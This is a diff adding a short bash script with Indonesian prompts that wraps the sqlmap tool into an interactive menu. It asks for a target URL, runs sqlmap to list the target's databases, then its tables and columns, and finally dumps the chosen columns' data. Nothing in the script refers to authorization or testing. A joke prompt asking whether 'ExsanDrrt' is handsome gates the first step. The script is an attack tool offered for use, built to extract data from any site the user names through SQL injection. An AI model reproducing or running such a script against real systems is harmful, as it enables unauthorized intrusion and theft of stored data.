@@ -1,0 +1,82 @@
+#!/bin/bash
+
+clear
+echo "   
+        \033[31;1m..::|[ Sqlmap ]|::.. \033[0m
+"
+echo -n "\n[+]Masukan Taget: "
+read TRGT
+echo "\ntarget: $TRGT"
+echo "[+]Memulai"
+
+echo -n "\n[?]menurutmu ExsanDrrt Ganteng...? (y)ya/(g)GAK: "
+read  yagak
+echo "\n==> Pilihan: $yagak"
+
+if [ $yagak = y ] || [ $yagak = Y ]
+then
+cd ../x
+python2 sqlmap.py -u $TRGT --dbs
+fi
+
+echo -n "=> Pilihan DataBase: "
+read gg
+echo "\ntarget: $gg"
+
+echo -n "\n[$]Lanjut...?(y): "
+read y
+echo "\ntarget: $y"
+
+if [ $y = y ] || [ $y = Y ]
+then
+cd ../x
+python2 sqlmap.py -u $TRGT -D $gg --tables
+fi
+
+echo -n "=> Pilihan Tabel: "
+read cc
+echo "\ntarget: $cc"
+
+echo -n "\n[$]Lanjut...?(y): "
+read yo
+echo "\ntarget: $yo"
+
+if [ $yo = y ] || [ $yo = Y ]
+then
+cd ../x
+python2 sqlmap.py -u $TRGT -D $gg -T $cc --columns
+fi
+
+echo -n "=> Pilihan Columns: "
+read dum
+echo "\ntarget: $dum"
+
+echo -n "\n[$]Lanjut...?(y): "
+read ye
+echo "\ntarget: $ye"
+
+if [ $ye = y ] || [ $ye = Y ]
+then
+cd ../x
+python2 sqlmap.py -u $TRGT -D $gg -T $cc -C $dum --dump
+fi
+
+echo "
+=> Tekan \033[33mB\033[0m untuk kembali
+=> Tekan \033[31mK\033[0m untuk keluar"
+echo -n "=> Pilihan: "
+read upil
+if [ $upil = b ] || [ $upil = B ]
+then
+clear
+cd ../tools
+sh start
+fi
+
+if [ $upil = k ] || [ $upil = K ]
+then
+clear
+sh exit
+fi
+
+
